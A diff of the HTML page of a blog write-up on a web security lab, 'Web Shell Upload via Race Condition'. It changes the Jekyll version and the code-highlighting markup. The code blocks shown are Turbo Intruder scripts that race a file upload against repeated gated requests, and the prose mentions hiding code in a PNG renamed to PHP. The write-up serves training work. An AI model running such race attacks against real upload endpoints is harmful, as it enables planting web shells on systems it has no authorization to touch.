@@ -14,7 +14,7 @@
   <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
   <link rel="manifest" href="/site.webmanifest">
   <link rel="alternate" type="application/rss+xml" title="Diaries of a Modern Ninja" href="https://nima.ninja/feed.xml"> <!-- Begin Jekyll SEO tag v2.8.0 -->
-<meta name="generator" content="Jekyll v4.3.1" />
+<meta name="generator" content="Jekyll v4.3.3" />
 <meta property="og:title" content="Expert Lab: Web Shell Upload via Race Condition" />
 <meta name="author" content="Nima" />
 <meta property="og:locale" content="en_US" />
@@ -152,7 +152,7 @@ The vulnerable code that introduces this race condition is as follows:</p>
 
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
 
-    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="n">endpoint</span><span class="p">,</span>
+    <span class="n">engine</span> <span class="o">=</span> <span class="nc">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="n">endpoint</span><span class="p">,</span>
 
                            <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span>
 
@@ -166,7 +166,7 @@ The vulnerable code that introduces this race condition is as follows:</p>
 
     <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">:</span>
 
-        <span class="n">engine</span><span class="p">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">req</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+        <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">req</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
 
         <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
 
@@ -177,7 +177,7 @@ The vulnerable code that introduces this race condition is as follows:</p>
 </span>
     <span class="k">if</span> <span class="n">req</span><span class="p">.</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">404</span><span class="p">:</span>
 
-        <span class="n">table</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+        <span class="n">table</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>I set concurrentConnections=80 by trial and error, more was hindering the main upload request so I set to 80. Then I downloaded a random 500KB PNG file from the web and used exiftool to add this code to it and renamed it to a PHP file:</p>
@@ -260,27 +260,27 @@ The vulnerable code that introduces this race condition is as follows:</p>
 </ol>
 
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
-    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="n">endpoint</span><span class="p">,</span> <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">10</span><span class="p">,)</span>
+    <span class="n">engine</span> <span class="o">=</span> <span class="nc">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="n">endpoint</span><span class="p">,</span> <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">10</span><span class="p">,)</span>
 
-    <span class="n">request1</span> <span class="o">=</span> <span class="s">'''&lt;YOUR-POST-REQUEST&gt;'''</span>
+    <span class="n">request1</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">&lt;YOUR-POST-REQUEST&gt;</span><span class="sh">'''</span>
 
-    <span class="n">request2</span> <span class="o">=</span> <span class="s">'''&lt;YOUR-GET-REQUEST&gt;'''</span>
+    <span class="n">request2</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">&lt;YOUR-GET-REQUEST&gt;</span><span class="sh">'''</span>
 
     <span class="c1"># the 'gate' argument blocks the final byte of each request until openGate is invoked
-</span>    <span class="n">engine</span><span class="p">.</span><span class="n">queue</span><span class="p">(</span><span class="n">request1</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s">'race1'</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
-        <span class="n">engine</span><span class="p">.</span><span class="n">queue</span><span class="p">(</span><span class="n">request2</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s">'race1'</span><span class="p">)</span>
+</span>    <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">request1</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+        <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">request2</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>
 
     <span class="c1"># wait until every 'race1' tagged request is ready
 </span>    <span class="c1"># then send the final byte of each request
 </span>    <span class="c1"># (this method is non-blocking, just like queue)
-</span>    <span class="n">engine</span><span class="p">.</span><span class="n">openGate</span><span class="p">(</span><span class="s">'race1'</span><span class="p">)</span>
+</span>    <span class="n">engine</span><span class="p">.</span><span class="nf">openGate</span><span class="p">(</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>
 
-    <span class="n">engine</span><span class="p">.</span><span class="n">complete</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
+    <span class="n">engine</span><span class="p">.</span><span class="nf">complete</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
-    <span class="n">table</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+    <span class="n">table</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
 </code></pre></div></div>
 
 <ol start="8">
